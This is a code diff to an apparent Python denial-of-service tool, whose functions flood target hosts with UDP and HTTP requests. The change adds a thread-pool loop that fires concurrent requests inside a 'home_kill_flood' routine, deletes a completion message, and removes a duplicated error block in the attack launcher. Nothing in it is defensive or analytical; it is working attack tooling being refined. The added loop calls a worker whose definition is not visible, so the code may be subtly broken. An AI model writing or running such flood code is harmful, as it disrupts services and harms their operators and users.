@@ -308,8 +308,6 @@ def udp_bypass_flood(host, port, num_requests, concurrency):
             executor.submit(send_udp_bypass)
 
 
-    print("Flood complete.")
-
 def https_udp_mix_flood(host, port, num_requests, concurrency):
     def send_mix():
         try:
@@ -341,6 +339,9 @@ def home_kill_flood(url, num_requests, concurrency, method="GET"):
             requests.request(method, full_url, headers=headers, timeout=(5, 10))
         except Exception:
             pass
+    with ThreadPoolExecutor(max_workers=concurrency) as executor:
+        for _ in range(num_requests):
+            executor.submit(send_laggy)
 
 
 def clear_screen():
@@ -760,9 +761,6 @@ def execute_attack(method, ip, port, threads, duration):
         error_logger.log_error("Execute attack", e)
         tw = moon_ui.get_term_width()
         err_msg = f"[!] Failed to launch attack: {str(e)}"
-        err_pad = " " * ((tw - len(err_msg)) // 2)
-        print(f"\n{err_pad}{moon_ui.gradient_text(err_msg)}\n")
-        return False
         err_pad = " " * ((tw - len(err_msg)) // 2)
         print(f"\n{err_pad}{moon_ui.gradient_text(err_msg)}\n")
         return False
